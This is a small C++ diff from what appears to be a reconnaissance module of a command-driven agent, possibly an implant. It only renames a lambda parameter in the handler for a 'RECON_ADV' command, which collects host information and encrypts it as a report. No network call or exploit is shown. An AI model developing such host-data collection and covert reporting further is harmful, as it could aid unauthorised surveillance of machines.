@@ -89,7 +89,7 @@ std::string ReconAdvancedModule::encrypt_report(const std::string& js){
 }
 
 void ReconAdvancedModule::init(){
-    register_command("RECON_ADV", [this](const nlohmann::json&){
+    register_command("RECON_ADV", [this](const nlohmann::json& cmd){
         auto info = collect();
         std::string payload = info.dump();
         std::string enc = encrypt_report(payload);
